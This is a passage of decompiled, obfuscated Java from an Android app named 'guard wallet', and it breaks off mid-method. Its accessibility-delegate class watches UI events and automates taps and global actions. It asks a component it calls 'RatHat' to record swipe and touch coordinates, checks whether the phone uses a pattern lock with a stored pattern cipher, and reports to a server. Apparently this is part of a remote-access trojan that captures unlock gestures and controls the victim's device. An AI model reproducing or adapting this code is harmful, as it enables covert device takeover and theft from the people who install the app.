package o;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.TargetActionCondition;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.UiObjectCollection;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFilterWithChild;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.EventSubscribe;
import com.guard.wallet.req.ListenPropResponse;
import com.guard.wallet.req.ListenResponseVO;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.resp.SearchNodeListResultVO;
import com.guard.wallet.resp.SearchNodeResultVO;
import com.guard.wallet.resp.UiObjectVO;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;

public class e {
   public String a;
   public final com.guard.wallet.utils.i b;
   public final String c;
   public final ConcurrentLinkedQueue d;
   public final ConcurrentHashMap e;
   public final ConcurrentHashMap f;
   public final AtomicInteger g;
   public final AtomicReference h;
   public final AtomicBoolean i;
   public final AtomicReference j;
   public final AtomicReference k;
   public final AtomicReference l;
   public final ConcurrentHashMap m;

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public e(Collection var1, String var2) {
      ConcurrentLinkedQueue var5 = new ConcurrentLinkedQueue();
      this.d = var5;
      this.e = new ConcurrentHashMap();
      this.f = new ConcurrentHashMap();
      this.g = new AtomicInteger(-1);
      this.h = new AtomicReference(null);
      this.i = new AtomicBoolean(false);
      this.j = new AtomicReference(null);
      this.k = new AtomicReference(null);
      this.l = new AtomicReference(null);
      this.m = new ConcurrentHashMap();
      com.guard.wallet.utils.i var6 = new com.guard.wallet.utils.i(10L);
      this.b = var6;
      this.c = String.valueOf(var6.a());

      Exception var10000;
      label39: {
         try {
            this.a = var2;
         } catch (Exception var9) {
            var10000 = var9;
            boolean var10001 = false;
            break label39;
         }

         if (var1 != null) {
            try {
               if (!var1.isEmpty()) {
                  var5.addAll(var1);
               }
            } catch (Exception var8) {
               var10000 = var8;
               boolean var12 = false;
               break label39;
            }
         }

         try {
            if (!a1.q.B(this.a) && var5.isEmpty()) {
               long var3 = var6.a();
               ListenWindow var11 = new ListenWindow(String.valueOf(var3), this.a, null);
               var5.add(var11);
            }

            return;
         } catch (Exception var7) {
            var10000 = var7;
            boolean var13 = false;
         }
      }

      Exception var10 = var10000;
      a1.q.s("AccessibilityDelegate", var10);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static void A(EventSubscribe var0, ArrayList var1) {
      Exception var10000;
      label125: {
         Iterator var9;
         try {
            if (var1.isEmpty() || var0.getReplyActions() == null || var0.getReplyActions().isEmpty()) {
               return;
            }

            var9 = var1.iterator();
         } catch (Exception var22) {
            var10000 = var22;
            boolean var10001 = false;
            break label125;
         }

         label122:
         while (true) {
            UiObject var7;
            try {
               if (!var9.hasNext()) {
                  return;
               }

               var7 = (UiObject)var9.next();
            } catch (Exception var20) {
               var10000 = var20;
               boolean var28 = false;
               break;
            }

            if (var7 != null) {
               Iterator var8;
               try {
                  var8 = var0.getReplyActions().iterator();
               } catch (Exception var19) {
                  var10000 = var19;
                  boolean var29 = false;
                  break;
               }

               int var2 = 0;

               while (true) {
                  TargetActionCondition var10;
                  try {
                     if (!var8.hasNext()) {
                        break;
                     }

                     var10 = (TargetActionCondition)var8.next();
                  } catch (Exception var14) {
                     var10000 = var14;
                     boolean var30 = false;
                     break label122;
                  }

                  int var3 = var2 + 1;

                  boolean var6;
                  try {
                     var6 = Objects.equals(var10.getActionType(), 0);
                  } catch (Exception var13) {
                     var10000 = var13;
                     boolean var31 = false;
                     break label122;
                  }

                  label131: {
                     StringBuilder var25;
                     if (var6) {
                        try {
                           var24 = var10.toGlobalActionCondition();
                        } catch (Exception var12) {
                           var10000 = var12;
                           boolean var32 = false;
                           break label122;
                        }

                        if (var24 == null) {
                           var6 = false;
                           break label131;
                        }

                        try {
                           var6 = com.guard.wallet.utils.g.a(var24);
                           var25 = new StringBuilder();
                           var25.append("Delegate GlobalActionAutomator actionByName:");
                           var25.append(var10.toString());
                        } catch (Exception var11) {
                           var10000 = var11;
                           boolean var33 = false;
                           break label122;
                        }
                     } else {
                        try {
                           var7.refresh();
                           var6 = var7.actionByName(var10);
                           var25 = new StringBuilder();
                           var25.append("Delegate source actionByName:");
                           var25.append(var10.toString());
                        } catch (Exception var18) {
                           var10000 = var18;
                           boolean var34 = false;
                           break label122;
                        }
                     }

                     try {
                        var26 = var25.toString();
                     } catch (Exception var17) {
                        var10000 = var17;
                        boolean var35 = false;
                        break label122;
                     }

                     try {
                        Log.d("AccessibilityDelegate", var26);
                     } catch (Exception var16) {
                        var10000 = var16;
                        boolean var36 = false;
                        break label122;
                     }
                  }

                  var2 = var3;
                  if (var6) {
                     var2 = var3;

                     long var4;
                     label108: {
                        try {
                           if (var3 >= var0.getReplyActions().size()) {
                              continue;
                           }

                           if (var0.getEventGap() != null && var0.getEventGap() > 0) {
                              var4 = (long)var0.getEventGap().intValue() * 1000L;
                              break label108;
                           }
                        } catch (Exception var21) {
                           var10000 = var21;
                           boolean var37 = false;
                           break label122;
                        }

                        var4 = 300L;
                     }

                     try {
                        Thread.sleep(var4);
                     } catch (Exception var15) {
                        var10000 = var15;
                        boolean var38 = false;
                        break label122;
                     }

                     var2 = var3;
                  }
               }
            }
         }
      }

      Exception var23 = var10000;
      a1.q.s("AccessibilityDelegate:replyActions", var23);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static LinkedList s(EventSubscribe var0, UiObject var1) {
      if (var1 != null) {
         Exception var10000;
         label85: {
            LinkedList var2;
            label90: {
               label95: {
                  try {
                     if (var0.getSelector() == null) {
                        return null;
                     }

                     var2 = new LinkedList();
                     if (var0.getSourceRule() == 0 || var0.getSourceRule() == 10) {
                        break label95;
                     }
                  } catch (Exception var9) {
                     var10000 = var9;
                     boolean var10001 = false;
                     break label85;
                  }

                  label93: {
                     try {
                        if (var0.getSourceRule() == 1) {
                           var10 = var0.getSelector().q(var1);
                           break label93;
                        }
                     } catch (Exception var8) {
                        var10000 = var8;
                        boolean var14 = false;
                        break label85;
                     }

                     label94: {
                        try {
                           if (var0.getSourceRule() != 2) {
                              break label94;
                           }

                           var11 = var0.getSelector().r(var1);
                        } catch (Exception var6) {
                           var10000 = var6;
                           boolean var15 = false;
                           break label85;
                        }

                        if (var11 == null) {
                           return var2;
                        }

                        try {
                           if (var11.size() > 0) {
                              var2.addAll(var11.getNodes());
                           }

                           return var2;
                        } catch (Exception var5) {
                           var10000 = var5;
                           boolean var16 = false;
                           break label85;
                        }
                     }

                     try {
                        Log.d("AccessibilityDelegate", "无效节点检索规则");
                        return var2;
                     } catch (Exception var3) {
                        var10000 = var3;
                        boolean var17 = false;
                        break label85;
                     }
                  }

                  if (var10 == null) {
                     return var2;
                  }
                  break label90;
               }

               try {
                  var10 = var0.getSelector().t(var1);
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var13 = false;
                  break label85;
               }

               if (var10 == null) {
                  return var2;
               }
            }

            try {
               var2.add(var10);
               return var2;
            } catch (Exception var4) {
               var10000 = var4;
               boolean var18 = false;
            }
         }

         Exception var12 = var10000;
         a1.q.s("AccessibilityDelegate", var12);
      }

      return null;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void B(EventSubscribe var1) {
      Exception var10000;
      label111: {
         try {
            if (!Objects.equals(var1.getListenType(), 8) && !Objects.equals(var1.getListenType(), 9)) {
               return;
            }
         } catch (Exception var15) {
            var10000 = var15;
            boolean var10001 = false;
            break label111;
         }

         Iterator var4;
         try {
            if (var1.getReplySubscribes() == null || var1.getReplySubscribes().isEmpty()) {
               return;
            }

            var1.setNeedReply(false);
            var4 = var1.getReplySubscribes().iterator();
         } catch (Exception var8) {
            var10000 = var8;
            boolean var19 = false;
            break label111;
         }

         while (true) {
            String var5;
            try {
               if (!var4.hasNext()) {
                  break;
               }

               var5 = (String)var4.next();
            } catch (Exception var12) {
               var10000 = var12;
               boolean var20 = false;
               break label111;
            }

            boolean var2;
            label100: {
               try {
                  if (!a1.q.B(var5)) {
                     var2 = this.f.containsKey(var5);
                     break label100;
                  }
               } catch (Exception var14) {
                  Exception var3 = var14;

                  try {
                     a1.q.s("AccessibilityDelegate", var3);
                  } catch (Exception var11) {
                     var10000 = var11;
                     boolean var21 = false;
                     break label111;
                  }
               }

               var2 = false;
            }

            if (var2) {
               label93: {
                  try {
                     if (Objects.equals(var1.getListenType(), 8)) {
                        this.j(var5);
                        break label93;
                     }
                  } catch (Exception var13) {
                     var10000 = var13;
                     boolean var22 = false;
                     break label111;
                  }

                  try {
                     this.a(var5);
                  } catch (Exception var10) {
                     var10000 = var10;
                     boolean var23 = false;
                     break label111;
                  }
               }

               try {
                  var1.setNeedReply(true);
               } catch (Exception var9) {
                  var10000 = var9;
                  boolean var24 = false;
                  break label111;
               }
            }
         }

         try {
            if (!var1.isNeedReply() || var1.getListenProps() != null && !var1.getListenProps().isEmpty()) {
               return;
            }
         } catch (Exception var7) {
            var10000 = var7;
            boolean var25 = false;
            break label111;
         }

         try {
            this.z(var1);
            ListenResponseVO var18 = new ListenResponseVO();
            var18.setSubscribeId(var1.getId());
            var18.setListenId(var1.getListenId());
            var18.setDelegateId(this.c);
            MessageRecordVO var17 = new MessageRecordVO();
            var17.setExtraBody(var18);
            var17.setIntentCode("android.accessibility.delegate.LISTEN_WINDOW_EVENT");
            if (MainApplication.getInstance() != null && MainApplication.getInstance().getHandlerMsgAndTimer() != null) {
               MainApplication.getInstance().getHandlerMsgAndTimer().b(var17);
            }

            return;
         } catch (Exception var6) {
            var10000 = var6;
            boolean var26 = false;
         }
      }

      Exception var16 = var10000;
      a1.q.s("AccessibilityDelegate", var16);
   }

   public final SearchNodeListResultVO C(UiObjectCollection var1) {
      if (var1 != null) {
         try {
            String var2 = String.valueOf(this.b.a());
            this.m.put(var2, var1);
            return new SearchNodeListResultVO(var2, var1.toListVO());
         } catch (Exception var3) {
            a1.q.s("AccessibilityDelegate", var3);
         }
      }

      return null;
   }

   public final SearchNodeResultVO D(UiObject var1) {
      if (var1 != null) {
         try {
            String var3 = String.valueOf(this.b.a());
            this.m.put(var3, var1);
            UiObjectVO var2 = new UiObjectVO(var1);
            return new SearchNodeResultVO(var3, var2);
         } catch (Exception var4) {
            a1.q.s("AccessibilityDelegate", var4);
         }
      }

      return null;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void E(EventSubscribe var1, Long var2) {
      Exception var10000;
      label178: {
         boolean var6;
         try {
            var6 = com.guard.wallet.utils.e.j();
         } catch (Exception var24) {
            var10000 = var24;
            boolean var10001 = false;
            break label178;
         }

         boolean var4 = false;
         boolean var5 = true;
         byte var3;
         if (var6) {
            var3 = 1;
         } else {
            var3 = 0;
         }

         ReqListenHelper var7;
         try {
            var7 = new ReqListenHelper(var1.getListenType(), var1.getId(), Integer.valueOf(var3));
            var7.setListenId(var1.getListenId());
            if (!a1.q.B(var1.getHelperProp())) {
               var7.setProp(var1.getHelperProp());
            }
         } catch (Exception var23) {
            var10000 = var23;
            boolean var31 = false;
            break label178;
         }

         if (var2 != null) {
            try {
               if (var2 > 0L) {
                  var7.setBatchId(String.valueOf(var2));
               }
            } catch (Exception var22) {
               var10000 = var22;
               boolean var32 = false;
               break label178;
            }
         }

         label179: {
            try {
               var7.setDelegateId(this.c);
               if (com.guard.wallet.http.l.i(var7) || h.e.S() != null && h.e.S().D()) {
                  break label179;
               }
            } catch (Exception var21) {
               var10000 = var21;
               boolean var33 = false;
               break label178;
            }

            label153: {
               try {
                  if (!Objects.equals(var1.getHelperProp(), "TOUCH_POINT")) {
                     break label153;
                  }

                  if (!Objects.equals(var7.getListenType(), 1)) {
                     com.guard.wallet.helper.r.e(this, var1.getCombineFilter(), var7);
                  }
               } catch (Exception var20) {
                  var10000 = var20;
                  boolean var34 = false;
                  break label178;
               }

               try {
                  if (Objects.equals(var7.getListenType(), 1)) {
                     com.guard.wallet.helper.r.e(this, null, var7);
                  }
               } catch (Exception var13) {
                  var10000 = var13;
                  boolean var35 = false;
                  break label178;
               }
            }

            try {
               if (!Objects.equals(var1.getHelperProp(), "GESTURE_POINTS")) {
                  break label179;
               }

               if (!Objects.equals(var7.getListenType(), 1)) {
                  com.guard.wallet.helper.o.d(this, var1.getCombineFilter(), var7);
               }
            } catch (Exception var19) {
               var10000 = var19;
               boolean var36 = false;
               break label178;
            }

            try {
               if (!Objects.equals(var7.getListenType(), 1)) {
                  break label179;
               }

               var27 = com.guard.wallet.utils.h.f();
            } catch (Exception var18) {
               var10000 = var18;
               boolean var37 = false;
               break label178;
            }

            label134: {
               label182: {
                  if (var27 != null) {
                     try {
                        if (Objects.equals(var27.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN")
                           && var27.getPatternCipher() != null
                           && !var27.getPatternCipher().isEmpty()) {
                           break label182;
                        }
                     } catch (Exception var17) {
                        var10000 = var17;
                        boolean var38 = false;
                        break label178;
                     }
                  }

                  try {
                     var28 = com.guard.wallet.utils.h.g();
                  } catch (Exception var12) {
                     var10000 = var12;
                     boolean var39 = false;
                     break label178;
                  }

                  var30 = var4;
                  if (var28 == null) {
                     break label134;
                  }

                  var30 = var4;

                  try {
                     if (!Objects.equals(var28.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN")) {
                        break label134;
                     }
                  } catch (Exception var16) {
                     var10000 = var16;
                     boolean var40 = false;
                     break label178;
                  }

                  var30 = var4;

                  try {
                     if (var28.getPatternCipher() == null) {
                        break label134;
                     }
                  } catch (Exception var15) {
                     var10000 = var15;
                     boolean var41 = false;
                     break label178;
                  }

                  var30 = var4;

                  try {
                     if (var28.getPatternCipher().isEmpty()) {
                        break label134;
                     }
                  } catch (Exception var14) {
                     var10000 = var14;
                     boolean var42 = false;
                     break label178;
                  }

                  var30 = true;
                  break label134;
               }

               var30 = var5;
            }

            if (!var30) {
               try {
                  com.guard.wallet.helper.o.d(this, var1.getCombineFilter(), var7);
               } catch (Exception var11) {
                  var10000 = var11;
                  boolean var43 = false;
                  break label178;
               }
            }
         }

         label104: {
            label103: {
               try {
                  if (com.guard.wallet.utils.g.p0()) {
                     break label103;
                  }
               } catch (Exception var10) {
                  var10000 = var10;
                  boolean var44 = false;
                  break label178;
               }

               var29 = "helpSubscribeId";
               break label104;
            }

            var29 = "lockSubscribeId";
         }

         try {
            var25 = var1.getId();
         } catch (Exception var9) {
            var10000 = var9;
            boolean var45 = false;
            break label178;
         }

         try {
            com.guard.wallet.utils.h.D(var25, var29);
            Log.d("AccessibilityDelegate", "已经发送辅助监听");
            return;
         } catch (Exception var8) {
            var10000 = var8;
            boolean var46 = false;
         }
      }

      Exception var26 = var10000;
      a1.q.s("AccessibilityDelegate", var26);
   }

   public final void F(UiObject var1) {
      this.h.set(var1);
   }

   public final void G() {
      AtomicInteger var1 = new AtomicInteger(15);

      while (!this.i.get() && var1.decrementAndGet() > 0) {
         com.guard.wallet.utils.g.T0(1);
      }
   }

   public final void a(String var1) {
      try {
         String var2 = com.guard.wallet.utils.h.l("helpSubscribeId");
         if (!a1.q.B(var2) && Objects.equals(var2, var1)) {
            if (com.guard.wallet.helper.r.k()) {
               com.guard.wallet.helper.r.g(false);
            }

            if (com.guard.wallet.helper.o.i() || com.guard.wallet.helper.o.h()) {
               com.guard.wallet.helper.o.f(null, false);
            }

            ReqListenHelper var4 = new ReqListenHelper(var1, 0);
            var4.setDelegateId(this.c);
            com.guard.wallet.http.l.h(var4);
            com.guard.wallet.utils.h.w("helpSubscribeId");
            Log.d("AccessibilityDelegate", "已经发送 取消辅助监听");
         }
      } catch (Exception var3) {
         a1.q.s("AccessibilityDelegate", var3);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean b(EventSubscribe var1) {
      boolean var5 = true;
      boolean var6 = true;
      boolean var4 = true;
      boolean var2 = var6;
      if (var1 != null) {
         boolean var3 = var5;
         var2 = var6;

         Exception var10000;
         label87: {
            try {
               if (a1.q.B(var1.getId())) {
                  return var2;
               }
            } catch (Exception var17) {
               var10000 = var17;
               boolean var10001 = false;
               break label87;
            }

            var3 = var5;
            var2 = var6;

            try {
               if (var1.getEventGap() == null) {
                  return var2;
               }
            } catch (Exception var16) {
               var10000 = var16;
               boolean var19 = false;
               break label87;
            }

            var3 = var5;
            var2 = var6;

            try {
               if (var1.getEventGap() <= 0) {
                  return var2;
               }
            } catch (Exception var15) {
               var10000 = var15;
               boolean var20 = false;
               break label87;
            }

            var3 = var5;

            Long var7;
            try {
               var7 = System.currentTimeMillis();
            } catch (Exception var14) {
               var10000 = var14;
               boolean var21 = false;
               break label87;
            }

            ConcurrentHashMap var9 = this.e;
            var3 = var5;

            Long var8;
            try {
               var8 = (Long)var9.get(var1.getId());
            } catch (Exception var13) {
               var10000 = var13;
               boolean var22 = false;
               break label87;
            }

            var2 = var4;
            label61:
            if (var8 != null) {
               var2 = var4;
               var3 = var5;

               try {
                  if (var8 <= 0L) {
                     break label61;
                  }
               } catch (Exception var12) {
                  var10000 = var12;
                  boolean var23 = false;
                  break label87;
               }

               var2 = var4;
               var3 = var5;

               try {
                  if (var7 - var8 >= (long)(var1.getEventGap() * 1000)) {
                     break label61;
                  }
               } catch (Exception var11) {
                  var10000 = var11;
                  boolean var24 = false;
                  break label87;
               }

               var2 = false;
            }

            var3 = var2;

            try {
               var9.put(var1.getId(), var7);
               return var2;
            } catch (Exception var10) {
               var10000 = var10;
               boolean var25 = false;
            }
         }

         Exception var18 = var10000;
         a1.q.s("AccessibilityDelegate", var18);
         var2 = var3;
      }

      return var2;
   }

   public final boolean c(String var1, String var2) {
      ConcurrentLinkedQueue var4 = this.d;

      try {
         if (!var4.isEmpty()) {
            ListenWindow var5 = new ListenWindow(var1, var2);
            return var4.contains(var5);
         } else {
            return Objects.equals(this.a, var1);
         }
      } catch (Exception var6) {
         a1.q.s("AccessibilityDelegate", var6);
         return false;
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public void d() {
      Exception var10000;
      label63: {
         try {
            com.guard.wallet.thread.l.a(this.c);
         } catch (Exception var8) {
            var10000 = var8;
            boolean var10001 = false;
            break label63;
         }

         AtomicReference var1 = this.h;

         try {
            if (var1.get() != null) {
               ((UiObject)var1.get()).recycle();
            }
         } catch (Exception var7) {
            var10000 = var7;
            boolean var11 = false;
            break label63;
         }

         try {
            var1.set(null);
         } catch (Exception var6) {
            var10000 = var6;
            boolean var12 = false;
            break label63;
         }

         ConcurrentLinkedQueue var2 = this.d;

         label48: {
            try {
               if (var2.isEmpty()) {
                  break label48;
               }

               var9 = var2.iterator();
            } catch (Exception var5) {
               var10000 = var5;
               boolean var13 = false;
               break label63;
            }

            while (true) {
               try {
                  if (!var9.hasNext()) {
                     break;
                  }

                  ((ListenWindow)var9.next()).destroy();
               } catch (Exception var4) {
                  var10000 = var4;
                  boolean var14 = false;
                  break label63;
               }
            }
         }

         try {
            var2.clear();
            this.m.clear();
            this.e.clear();
            this.f.clear();
            this.g.set(-1);
            this.j.set(null);
            this.k.set(null);
            this.a = null;
            return;
         } catch (Exception var3) {
            var10000 = var3;
            boolean var15 = false;
         }
      }

      Exception var10 = var10000;
      a1.q.s("AccessibilityDelegate", var10);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void e(ListenWindow var1, j0 var2) {
      Exception var10000;
      label178: {
         Long var5;
         try {
            if (var1.getEventSubscribes() == null || var1.getEventSubscribes().isEmpty()) {
               return;
            }

            var5 = 0L;
         } catch (Exception var24) {
            var10000 = var24;
            boolean var10001 = false;
            break label178;
         }

         try {
            if (var1.getListenType() == 1) {
               var5 = com.guard.wallet.utils.h.j("lockBatchId");
            }
         } catch (Exception var23) {
            var10000 = var23;
            boolean var30 = false;
            break label178;
         }

         Long var6 = var5;

         try {
            if (var5 <= 0L) {
               var6 = this.b.a();
            }
         } catch (Exception var22) {
            var10000 = var22;
            boolean var31 = false;
            break label178;
         }

         try {
            var26 = var1.getEventSubscribes().iterator();
         } catch (Exception var21) {
            var10000 = var21;
            boolean var32 = false;
            break label178;
         }

         while (true) {
            EventSubscribe var7;
            try {
               while (true) {
                  if (!var26.hasNext()) {
                     return;
                  }

                  var7 = (EventSubscribe)var26.next();
                  if (this.b(var7)) {
                     var7.setEventTimestamp(var2.g);
                     if (a1.q.B(var7.getListenId())) {
                        var7.setListenId(var1.getId());
                     }
                     break;
                  }
               }
            } catch (Exception var15) {
               var10000 = var15;
               boolean var33 = false;
               break;
            }

            try {
               if (a1.q.B(var7.getId()) && !a1.q.B(var7.getListenId())) {
                  var7.setId(var7.getListenId());
               }
            } catch (Exception var20) {
               var10000 = var20;
               boolean var34 = false;
               break;
            }

            int var3;
            try {
               var3 = var2.b;
            } catch (Exception var14) {
               var10000 = var14;
               boolean var35 = false;
               break;
            }

            boolean var4;
            label153: {
               label181: {
                  label151: {
                     try {
                        if (var7.getEventTypes() == null || var7.getEventTypes().isEmpty()) {
                           break label181;
                        }
                     } catch (Exception var19) {
                        var10000 = var19;
                        boolean var36 = false;
                        break label151;
                     }

                     try {
                        var4 = var7.getEventTypes().contains(var3);
                        break label153;
                     } catch (Exception var18) {
                        var10000 = var18;
                        boolean var37 = false;
                     }
                  }

                  Exception var8 = var10000;

                  try {
                     a1.q.s("AccessibilityDelegate", var8);
                  } catch (Exception var13) {
                     var10000 = var13;
                     boolean var38 = false;
                     break;
                  }

                  var4 = false;
                  break label153;
               }

               var4 = true;
            }

            if (var4) {
               try {
                  if (var7.getReplySubscribes() != null && !var7.getReplySubscribes().isEmpty()) {
                     this.B(var7);
                  }
               } catch (Exception var17) {
                  var10000 = var17;
                  boolean var39 = false;
                  break;
               }

               try {
                  if (var7.getListenHelper() && !a1.q.B(var7.getHelperProp())) {
                     StringBuilder var27 = new StringBuilder();
                     var27.append("向本地7912RatHat请求监听滑动坐标、触摸坐标:");
                     var27.append(var7.getHelperProp());
                     Log.d("AccessibilityDelegate", var27.toString());
                     this.E(var7, var6);
                  }
               } catch (Exception var12) {
                  var10000 = var12;
                  boolean var40 = false;
                  break;
               }

               label133: {
                  try {
                     if (var7.getListenProps() != null && !var7.getListenProps().isEmpty()) {
                        break label133;
                     }
                  } catch (Exception var16) {
                     var10000 = var16;
                     boolean var41 = false;
                     break;
                  }

                  try {
                     if (var7.getReplyActions() == null || var7.getReplyActions().isEmpty()) {
                        continue;
                     }
                  } catch (Exception var11) {
                     var10000 = var11;
                     boolean var42 = false;
                     break;
                  }
               }

               ArrayList var28;
               try {
                  var28 = this.r(var7, var2.a);
                  if (var7.getListenProps() != null && !var7.getListenProps().isEmpty()) {
                     this.x(var7, var28, var2.e, var2.f, var6);
                  }
               } catch (Exception var10) {
                  var10000 = var10;
                  boolean var43 = false;
                  break;
               }

               try {
                  if (var7.getReplyActions() != null && !var7.getReplyActions().isEmpty()) {
                     A(var7, var28);
                  }
               } catch (Exception var9) {
                  var10000 = var9;
                  boolean var44 = false;
                  break;
               }
            }
         }
      }

      Exception var25 = var10000;
      a1.q.s("AccessibilityDelegate:everyEventSubscribe", var25);
   }

   @Override
   public boolean equals(Object var1) {
      boolean var2 = true;
      if (this == var1) {
         return true;
      } else if (var1 != null && this.getClass() == var1.getClass()) {
         var1 = var1;
         if (!Objects.equals(this.a, var1.a) || !Objects.equals(this.c, var1.c)) {
            var2 = false;
         }

         return var2;
      } else {
         return false;
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final SearchNodeListResultVO f(CombineFilterWithChild var1) {
      if (var1 != null) {
         Exception var10000;
         label64: {
            UiObject var4;
            try {
               if (var1.getParentFilter() == null) {
                  return null;
               }

               var4 = this.n(var1.getParentFilter());
            } catch (Exception var10) {
               var10000 = var10;
               boolean var10001 = false;
               break label64;
            }

            if (var4 == null) {
               return null;
            }

            LinkedList var3;
            UiObjectCollection var5;
            try {
               var3 = new LinkedList();
               var5 = var4.findByCombine(var1.getParentFilter());
            } catch (Exception var9) {
               var10000 = var9;
               boolean var13 = false;
               break label64;
            }

            label52:
            if (var5 != null) {
               try {
                  if (var5.empty()) {
                     break label52;
                  }
               } catch (Exception var8) {
                  var10000 = var8;
                  boolean var14 = false;
                  break label64;
               }

               int var2 = 0;

               while (true) {
                  try {
                     if (var2 >= var5.size()) {
                        break;
                     }

                     var4 = var5.get(var2);
                     if (var4.findOneByCombine(var1.getChildFilter()) != null) {
                        var3.add(var4);
                     }
                  } catch (Exception var7) {
                     var10000 = var7;
                     boolean var15 = false;
                     break label64;
                  }

                  var2++;
               }
            }

            try {
               return this.C(UiObjectCollection.of(var3));
            } catch (Exception var6) {
               var10000 = var6;
               boolean var16 = false;
            }
         }

         Exception var11 = var10000;
         a1.q.s("AccessibilityDelegate", var11);
      }

      return null;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final SearchNodeListResultVO g(CombineFilterWithChild var1) {
      if (var1 != null) {
         Exception var10000;
         label64: {
            UiObject var4;
            try {
               if (var1.getParentFilter() == null) {
                  return null;
               }

               var4 = this.n(var1.getParentFilter());
            } catch (Exception var10) {
               var10000 = var10;
               boolean var10001 = false;
               break label64;
            }

            if (var4 == null) {
               return null;
            }

            LinkedList var3;
            try {
               var3 = new LinkedList();
               var12 = var4.findByCombine(var1.getParentFilter());
            } catch (Exception var9) {
               var10000 = var9;
               boolean var13 = false;
               break label64;
            }

            label52:
            if (var12 != null) {
               try {
                  if (var12.empty()) {
                     break label52;
                  }
               } catch (Exception var8) {
                  var10000 = var8;
                  boolean var14 = false;
                  break label64;
               }

               int var2 = 0;

               while (true) {
                  try {
                     if (var2 >= var12.size()) {
                        break;
                     }

                     UiObject var5 = var12.get(var2);
                     if (var5.findOneByCombine(var1.getChildFilter()) == null) {
                        var3.add(var5);
                     }
                  } catch (Exception var7) {
                     var10000 = var7;
                     boolean var15 = false;
                     break label64;
                  }

                  var2++;
               }
            }

            try {
               return this.C(UiObjectCollection.of(var3));
            } catch (Exception var6) {
               var10000 = var6;
               boolean var16 = false;
            }
         }

         Exception var11 = var10000;
         a1.q.s("AccessibilityDelegate", var11);
      }

      return null;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final SearchNodeListResultVO h(CombineFiltersWithOr var1) {
      if (var1 != null) {
         Exception var10000;
         label70: {
            Iterator var2;
            UiObjectCollection var3;
            try {
               if (var1.getFilters() == null || var1.getFilters().isEmpty()) {
                  return null;
               }

               var3 = UiObjectCollection.of(null);
               var2 = var1.getFilters().iterator();
            } catch (Exception var7) {
               var10000 = var7;
               boolean var10001 = false;
               break label70;
            }

            while (true) {
               CombineFilter var4;
               try {
                  if (!var2.hasNext()) {
                     break;
                  }

                  var4 = (CombineFilter)var2.next();
               } catch (Exception var11) {
                  var10000 = var11;
                  boolean var14 = false;
                  break label70;
               }

               if (var4 != null) {
                  UiObject var5;
                  try {
                     var4.setTarget(var1.getTarget());
                     var4.setResUnique(var1.getResUnique());
                     var5 = this.n(var4);
                  } catch (Exception var9) {
                     var10000 = var9;
                     boolean var15 = false;
                     break label70;
                  }

                  if (var5 != null) {
                     try {
                        var13 = var5.findByCombine(var4);
                     } catch (Exception var8) {
                        var10000 = var8;
                        boolean var16 = false;
                        break label70;
                     }

                     if (var13 != null) {
                        try {
                           if (var13.size() > 0) {
                              var3.getNodes().addAll(var13.getNodes());
                           }
                        } catch (Exception var10) {
                           var10000 = var10;
                           boolean var17 = false;
                           break label70;
                        }
                     }
                  }
               }
            }

            try {
               return this.C(var3);
            } catch (Exception var6) {
               var10000 = var6;
               boolean var18 = false;
            }
         }

         Exception var12 = var10000;
         a1.q.s("AccessibilityDelegate", var12);
      }

      return null;
   }

   @Override
   public int hashCode() {
      return Objects.hash(this.a, this.c);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final SearchNodeResultVO i(CombineFiltersWithOr var1) {
      if (var1 != null) {
         Exception var10000;
         label76: {
            Iterator var3;
            try {
               if (var1.getFilters() == null || var1.getFilters().isEmpty()) {
                  return null;
               }

               var3 = var1.getFilters().iterator();
            } catch (Exception var11) {
               var10000 = var11;
               boolean var10001 = false;
               break label76;
            }

            while (true) {
               CombineFilter var2;
               try {
                  if (!var3.hasNext()) {
                     return null;
                  }

                  var2 = (CombineFilter)var3.next();
               } catch (Exception var8) {
                  var10000 = var8;
                  boolean var17 = false;
                  break;
               }

               if (var2 != null) {
                  try {
                     var2.setTarget(var1.getTarget());
                     var2.setResUnique(var1.getResUnique());
                  } catch (Exception var7) {
                     var10000 = var7;
                     boolean var18 = false;
                     break;
                  }

                  label70: {
                     label82: {
                        label83: {
                           UiObject var4;
                           try {
                              var4 = this.n(var2);
                           } catch (Exception var10) {
                              var10000 = var10;
                              boolean var19 = false;
                              break label83;
                           }

                           if (var4 == null) {
                              break label82;
                           }

                           try {
                              var14 = this.D(var4.findOneByCombine(var2));
                              break label70;
                           } catch (Exception var9) {
                              var10000 = var9;
                              boolean var20 = false;
                           }
                        }

                        Exception var13 = var10000;

                        try {
                           a1.q.s("AccessibilityDelegate", var13);
                        } catch (Exception var6) {
                           var10000 = var6;
                           boolean var21 = false;
                           break;
                        }
                     }

                     var14 = null;
                  }

                  if (var14 != null) {
                     UiObjectVO var15;
                     try {
